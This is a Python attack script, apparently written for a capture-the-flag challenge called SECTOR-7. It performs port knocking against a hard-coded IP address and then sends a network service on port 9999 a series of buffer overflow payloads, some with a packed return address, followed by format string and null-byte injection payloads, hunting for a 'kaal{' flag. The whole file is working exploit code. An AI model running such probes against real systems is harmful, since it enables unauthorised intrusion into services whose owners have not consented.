#!/usr/bin/env python3
"""
SECTOR-7 Buffer Overflow Exploitation
Try to bypass password check via buffer overflow
"""

import socket
import time
import struct

TARGET_IP = "13.206.58.35"
KNOCK_SEQUENCE = [9000, 2600, 1337]
SERVICE_PORT = 9999

def knock_ports():
    """Perform port knocking"""
    for port in KNOCK_SEQUENCE:
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(0.3)
            sock.connect((TARGET_IP, port))
            sock.close()
        except:
            pass
        time.sleep(0.2)

def try_payload(payload, description=""):
    """Try a payload"""
    try:
        knock_ports()
        time.sleep(0.3)
        
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.settimeout(3)
        sock.connect((TARGET_IP, SERVICE_PORT))
        
        # Receive banner
        banner = sock.recv(4096)
        
        # Send payload
        sock.send(payload)
        time.sleep(0.5)
        
        # Get response
        try:
            response = sock.recv(4096)
            resp_text = response.decode('utf-8', errors='ignore')
            
            if "kaal{" in resp_text.lower() or ("flag" in resp_text.lower() and "denied" not in resp_text.lower()):
                print(f"\n[!!!] SUCCESS with {description}!")
                print(resp_text)
                return True
            elif "denied" not in resp_text.lower() and "incorrect" not in resp_text.lower() and len(resp_text) > 50:
                print(f"\n[+] Interesting response with {description}:")
                print(resp_text[:200])
        except:
            pass
        
        sock.close()
        return False
    except Exception as e:
        return False

def main():
    print("[*] SECTOR-7 Buffer Overflow Attack")
    print("[*] Trying various overflow payloads...\n")
    
    # Try different buffer sizes
    for size in [100, 128, 150, 200, 256, 300, 400, 500, 1000]:
        print(f"[*] Trying buffer size: {size}")
        
        # Simple overflow
        payload = b"A" * size + b"\n"
        if try_payload(payload, f"overflow {size}"):
            return
        
        # Overflow with return address
        payload = b"A" * size + struct.pack("<Q", 0x401337) + b"\n"
        if try_payload(payload, f"overflow {size} + ret"):
            return
        
        time.sleep(0.3)
    
    # Try format string
    print("\n[*] Trying format string attacks...")
    format_strings = [
        b"%x" * 20 + b"\n",
        b"%s" * 10 + b"\n",
        b"%p" * 20 + b"\n",
        b"AAAA" + b"%x." * 20 + b"\n",
    ]
    
    for fs in format_strings:
        if try_payload(fs, "format string"):
            return
        time.sleep(0.3)
    
    # Try null bytes
    print("\n[*] Trying null byte injection...")
    null_payloads = [
        b"\x00\n",
        b"admin\x00\n",
        b"KAAL\x00\n",
        b"\x00" * 100 + b"\n",
    ]
    
    for np in null_payloads:
        if try_payload(np, "null bytes"):
            return
        time.sleep(0.3)
    
    print("\n[-] No overflow worked")
    print("[*] Stack guards are likely preventing simple overflows")

if __name__ == "__main__":
    main()
